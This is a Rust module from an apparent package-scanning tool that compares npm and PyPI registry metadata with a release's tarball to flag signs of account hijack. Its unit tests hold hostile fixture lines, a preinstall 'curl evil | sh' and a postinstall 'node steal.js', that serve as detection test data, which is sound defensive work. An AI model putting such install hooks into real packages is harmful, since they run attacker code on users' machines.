//! What the package registry says about the version being scanned, compared
//! with the tarball's own manifest and with the version published before it.
//!
//! Static analysis sees the code; these checks see how it was published.
//! A hijacked maintainer account publishes code that looks like any other
//! release, but the release itself changes: an install script appears, the
//! provenance attestation disappears, the manifest npm shows differs from
//! the one npm runs, the maintainer's email domain has lapsed.

use crate::vsix::PackageTarget;
use crate::RuleMatch;
use serde_json::Value;
use std::collections::BTreeSet;
use std::path::Path;

pub const MANIFEST_CONFUSION: &str = "npm Manifest Confusion";
pub const INSTALL_SCRIPT_ADDED: &str = "Install Script Added in This Version";
pub const NEW_DEPENDENCIES: &str = "New Dependencies in This Version";
pub const PROVENANCE_DROPPED: &str = "npm Provenance Dropped";
pub const EMAIL_DOMAIN_UNREGISTERED: &str = "Maintainer Email Domain Unregistered";

/// Lifecycle scripts npm runs on `npm install` of a registry package.
const INSTALL_SCRIPTS: [&str; 3] = ["preinstall", "install", "postinstall"];

/// Metadata documents are small, but the abbreviated packument of a package
/// with thousands of versions (typescript) is ~9 MB.
const MAX_METADATA_BYTES: usize = 32 * 1024 * 1024;

/// Mail providers whose domains never lapse: no lookup needed.
const MAIL_PROVIDERS: &[&str] = &[
    "gmail.com",
    "googlemail.com",
    "outlook.com",
    "hotmail.com",
    "live.com",
    "yahoo.com",
    "icloud.com",
    "me.com",
    "protonmail.com",
    "proton.me",
    "qq.com",
    "163.com",
    "126.com",
    "users.noreply.github.com",
];

fn finding(name: &str, severity: &str, context: String) -> RuleMatch {
    RuleMatch {
        file_path: "package.json".to_string(),
        line_number: 1,
        matched_pattern: name.to_string(),
        severity: severity.to_string(),
        context,
    }
}

fn install_scripts(manifest: &Value) -> BTreeSet<String> {
    INSTALL_SCRIPTS
        .iter()
        .filter(|s| {
            manifest["scripts"][**s]
                .as_str()
                .is_some_and(|v| !v.trim().is_empty())
        })
        .map(|s| s.to_string())
        .collect()
}

fn dependency_names(manifest: &Value) -> BTreeSet<String> {
    ["dependencies", "optionalDependencies"]
        .iter()
        .filter_map(|k| manifest[*k].as_object())
        .flat_map(|o| o.keys().cloned())
        .collect()
}

/// npm shows and audits the registry's copy of the manifest but installs from
/// the tarball. An install script or dependency only the tarball has is
/// invisible to every tool that reads the registry. The reverse direction is
/// benign: npm itself adds `install: node-gyp rebuild` for `binding.gyp`.
fn manifest_confusion(registry: &Value, tarball: &Value) -> Vec<RuleMatch> {
    let hidden_scripts: Vec<String> = install_scripts(tarball)
        .difference(&install_scripts(registry))
        .cloned()
        .collect();
    let hidden_deps: Vec<String> = dependency_names(tarball)
        .difference(&dependency_names(registry))
        .cloned()
        .collect();
    if hidden_scripts.is_empty() && hidden_deps.is_empty() {
        return Vec::new();
    }
    let mut parts = Vec::new();
    if !hidden_scripts.is_empty() {
        parts.push(format!("install scripts {}", hidden_scripts.join(", ")));
    }
    if !hidden_deps.is_empty() {
        parts.push(format!("dependencies {}", hidden_deps.join(", ")));
    }
    vec![finding(
        MANIFEST_CONFUSION,
        "critical",
        format!(
            "The tarball's package.json declares {} that the registry metadata does not show",
            parts.join("; ")
        ),
    )]
}

/// `major.minor.patch` plus prerelease tag.
type VersionKey<'a> = ((u64, u64, u64), Option<&'a str>);

/// `major.minor.patch[-pre]` as a sortable key; build metadata ignored.
fn version_key(v: &str) -> Option<VersionKey<'_>> {
    let v = v.split('+').next()?;
    let (core, pre) = match v.split_once('-') {
        Some((c, p)) => (c, Some(p)),
        None => (v, None),
    };
    let mut nums = core.split('.').map(|n| n.parse::<u64>().ok());
    let key = (nums.next()??, nums.next()??, nums.next()??);
    Some((key, pre))
}

/// The highest version below `current` on the same major line. Prereleases
/// count only when the scanned version is one. Same major: the abbreviated
/// packument has no publish dates, and maintenance releases break semver
/// order in time (express 4.22.3, with provenance, came out after 5.0.0).
/// Hijacks ship as patch/minor bumps anyway, to reach `^` ranges.
fn previous_version<'a>(versions: impl Iterator<Item = &'a str>, current: &str) -> Option<&'a str> {
    let (cur, cur_pre) = version_key(current)?;
    versions
        .filter_map(|v| version_key(v).map(|k| (k, v)))
        .filter(|((k, _), _)| k.0 == cur.0)
        .filter(|((_, pre), _)| pre.is_none() || cur_pre.is_some())
        .filter(|((k, pre), _)| (*k, pre.is_none(), *pre) < (cur, cur_pre.is_none(), cur_pre))
        .max_by(|((a, ap), _), ((b, bp), _)| (a, ap.is_none(), ap).cmp(&(b, bp.is_none(), bp)))
        .map(|(_, v)| v)
}

/// Compare the scanned version with the one before it, from the abbreviated
/// packument (`hasInstallScript`, `dependencies` per version).
fn version_diff(packument: &Value, current: &str, tarball: &Value) -> Vec<RuleMatch> {
    let Some(versions) = packument["versions"].as_object() else {
        return Vec::new();
    };
    let Some(prev) = previous_version(versions.keys().map(String::as_str), current) else {
        return Vec::new(); // first release: nothing to compare with
    };
    let before = &versions[prev];
    let mut out = Vec::new();
    let scripts_now = install_scripts(tarball);
    if !scripts_now.is_empty() && !before["hasInstallScript"].as_bool().unwrap_or(false) {
        out.push(finding(
            INSTALL_SCRIPT_ADDED,
            "high",
            format!(
                "{} {} runs {} at install time; {} ran nothing",
                tarball["name"].as_str().unwrap_or("package"),
                current,
                scripts_now.into_iter().collect::<Vec<_>>().join(", "),
                prev
            ),
        ));
    }
    let added: Vec<String> = dependency_names(tarball)
        .difference(&dependency_names(before))
        .cloned()
        .collect();
    if !added.is_empty() {
        out.push(finding(
            NEW_DEPENDENCIES,
            "low",
            format!("Added since {}: {}", prev, added.join(", ")),
        ));
    }
    out
}

/// npm provenance (a signed link from the tarball to a CI build) is opt-in
/// per publish; a release without it after releases with it was published
/// from somewhere else, such as a stolen token on a laptop.
fn provenance_dropped(previous: &Value, current: &Value) -> Option<RuleMatch> {
    let has = |doc: &Value| doc["dist"]["attestations"].is_object();
    (has(previous) && !has(current)).then(|| {
        finding(
            PROVENANCE_DROPPED,
            "high",
            format!(
                "{} carried a provenance attestation; {} does not",
                previous["version"]
                    .as_str()
                    .unwrap_or("the previous version"),
                current["version"].as_str().unwrap_or("this version")
            ),
        )
    })
}

/// Email domains of everyone who can publish this version.
fn email_domains(emails: impl Iterator<Item = String>) -> BTreeSet<String> {
    emails
        .filter_map(|e| {
            e.rsplit_once('@')
                .map(|(_, d)| d.trim().to_ascii_lowercase())
        })
        .filter(|d| d.contains('.') && !MAIL_PROVIDERS.contains(&d.as_str()))
        .collect()
}

/// A lapsed domain can be re-registered by anyone, who then receives the
/// account's password-reset mail. NXDOMAIN through DNS-over-HTTPS; a lookup
/// that fails for any other reason is not evidence.
async fn unregistered(client: &reqwest::Client, domains: BTreeSet<String>) -> Vec<RuleMatch> {
    let mut out = Vec::new();
    for domain in domains.into_iter().take(10) {
        let answer = client
            .get("https://cloudflare-dns.com/dns-query")
            .query(&[("name", domain.as_str()), ("type", "NS")])
            .header("Accept", "application/dns-json")
            .send()
            .await;
        let status = match answer {
            Ok(resp) => resp
                .json::<Value>()
                .await
                .ok()
                .and_then(|v| v["Status"].as_u64()),
            Err(_) => None,
        };
        if status == Some(3) {
            out.push(finding(
                EMAIL_DOMAIN_UNREGISTERED,
                "high",
                format!(
                    "Maintainer email domain {} does not exist; whoever registers it can reset the account password",
                    domain
                ),
            ));
        }
    }
    out
}

async fn get_json(client: &reqwest::Client, url: &str, accept: Option<&str>) -> Option<Value> {
    let mut req = client.get(url);
    if let Some(a) = accept {
        req = req.header("Accept", a);
    }
    let resp = req.send().await.ok()?.error_for_status().ok()?;
    if resp
        .content_length()
        .is_some_and(|n| n as usize > MAX_METADATA_BYTES)
    {
        return None;
    }
    let body = resp.bytes().await.ok()?;
    (body.len() <= MAX_METADATA_BYTES)
        .then(|| serde_json::from_slice(&body).ok())
        .flatten()
}

/// Registry checks for an `npm:` / `pypi:` target unpacked at `root`.
/// Network failures yield nothing: these findings corroborate, never gate.
pub async fn findings(pkg: &PackageTarget, root: &Path) -> Vec<RuleMatch> {
    let Ok(client) = crate::vsix::http_client() else {
        return Vec::new();
    };
    match pkg.ecosystem {
        "npm" => npm_findings(&client, &pkg.name, root).await,
        "pypi" => pypi_findings(&client, pkg).await,
        _ => Vec::new(),
    }
}

async fn npm_findings(client: &reqwest::Client, name: &str, root: &Path) -> Vec<RuleMatch> {
    // The version actually unpacked, not whatever `latest` points at now.
    let Some(tarball) = std::fs::read_to_string(root.join("package.json"))
        .ok()
        .and_then(|t| serde_json::from_str::<Value>(&t).ok())
    else {
        return Vec::new();
    };
    let Some(version) = tarball["version"].as_str() else {
        return Vec::new();
    };
    let base = format!("https://registry.npmjs.org/{}", name.replace('/', "%2F"));
    let Some(registry) = get_json(client, &format!("{}/{}", base, version), None).await else {
        return Vec::new();
    };
    let mut out = manifest_confusion(&registry, &tarball);

    let abbreviated = "application/vnd.npm.install-v1+json";
    if let Some(packument) = get_json(client, &base, Some(abbreviated)).await {
        out.extend(version_diff(&packument, version, &tarball));
        let prev = packument["versions"]
            .as_object()
            .and_then(|v| previous_version(v.keys().map(String::as_str), version));
        if let Some(prev) = prev {
            if let Some(prev_doc) = get_json(client, &format!("{}/{}", base, prev), None).await {
                out.extend(provenance_dropped(&prev_doc, &registry));
            }
        }
    }

    let emails = registry["maintainers"]
        .as_array()
        .into_iter()
        .flatten()
        .chain(std::iter::once(&registry["_npmUser"]))
        .filter_map(|m| m["email"].as_str().map(str::to_string));
    out.extend(unregistered(client, email_domains(emails)).await);
    out
}

async fn pypi_findings(client: &reqwest::Client, pkg: &PackageTarget) -> Vec<RuleMatch> {
    let url = match &pkg.version {
        Some(v) => format!("https://pypi.org/pypi/{}/{}/json", pkg.name, v),
        None => format!("https://pypi.org/pypi/{}/json", pkg.name),
    };
    let Some(doc) = get_json(client, &url, None).await else {
        return Vec::new();
    };
    // `author_email` may hold several comma-separated addresses.
    let emails = ["author_email", "maintainer_email"]
        .iter()
        .filter_map(|k| doc["info"][*k].as_str())
        .flat_map(|s| s.split(','))
        .map(|s| s.trim().trim_end_matches('>').to_string());
    unregistered(client, email_domains(emails)).await
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn names(v: &[RuleMatch]) -> Vec<&str> {
        v.iter().map(|m| m.matched_pattern.as_str()).collect()
    }

    #[test]
    fn hidden_install_script_is_manifest_confusion() {
        let registry = json!({"name": "x", "version": "1.0.0", "scripts": {"test": "jest"}});
        let tarball = json!({"name": "x", "version": "1.0.0",
            "scripts": {"test": "jest", "postinstall": "node steal.js"},
            "dependencies": {"left-pad": "1"}});
        let out = manifest_confusion(&registry, &tarball);
        assert_eq!(names(&out), vec![MANIFEST_CONFUSION]);
        assert!(out[0].context.contains("postinstall") && out[0].context.contains("left-pad"));
        // npm adds `install: node-gyp rebuild` to the registry copy itself.
        let gyp = json!({"scripts": {"install": "node-gyp rebuild"}});
        assert!(manifest_confusion(&gyp, &json!({"scripts": {}})).is_empty());
    }

    #[test]
    fn previous_version_skips_prereleases_and_handles_order() {
        let v = [
            "1.0.0",
            "1.10.0",
            "1.9.3",
            "2.0.0-rc.1",
            "2.0.0",
            "2.0.1",
            "0.9.0",
            "0.8.1",
        ];
        let prev = |cur| previous_version(v.iter().copied(), cur);
        assert_eq!(prev("2.0.1"), Some("2.0.0"));
        assert_eq!(prev("1.10.0"), Some("1.9.3"));
        assert_eq!(prev("2.0.0-rc.2"), Some("2.0.0-rc.1"));
        assert_eq!(prev("0.9.0"), Some("0.8.1"));
        // First release of a major line: nothing to compare with (express 5.0.0
        // vs 4.22.3, a later maintenance release, was a false "provenance dropped").
        assert_eq!(prev("2.0.0"), None);
    }

    #[test]
    fn install_script_added_since_previous_version() {
        let packument = json!({"versions": {
            "1.0.0": {"hasInstallScript": false, "dependencies": {"a": "1"}},
            "1.0.1": {"hasInstallScript": true}
        }});
        let tarball = json!({"name": "x", "version": "1.0.1",
            "scripts": {"preinstall": "curl evil | sh"},
            "dependencies": {"a": "1", "b": "2"}});
        let out = version_diff(&packument, "1.0.1", &tarball);
        assert_eq!(names(&out), vec![INSTALL_SCRIPT_ADDED, NEW_DEPENDENCIES]);
        // It always had one: nothing new.
        let always = json!({"versions": {"1.0.0": {"hasInstallScript": true}, "1.0.1": {}}});
        assert!(names(&version_diff(&always, "1.0.1", &tarball))
            .iter()
            .all(|n| *n != INSTALL_SCRIPT_ADDED));
    }

    #[test]
    fn dropped_provenance() {
        let with = json!({"version": "1.0.0", "dist": {"attestations": {"url": "u"}}});
        let without = json!({"version": "1.0.1", "dist": {}});
        assert!(provenance_dropped(&with, &without).is_some());
        assert!(provenance_dropped(&without, &with).is_none());
        assert!(provenance_dropped(&without, &without).is_none());
    }

    #[test]
    fn email_domains_skip_mail_providers() {
        let d = email_domains(
            [
                "a@gmail.com",
                "b@Corp.Example",
                "broken",
                "c@users.noreply.github.com",
            ]
            .into_iter()
            .map(String::from),
        );
        assert_eq!(d.into_iter().collect::<Vec<_>>(), vec!["corp.example"]);
    }
}
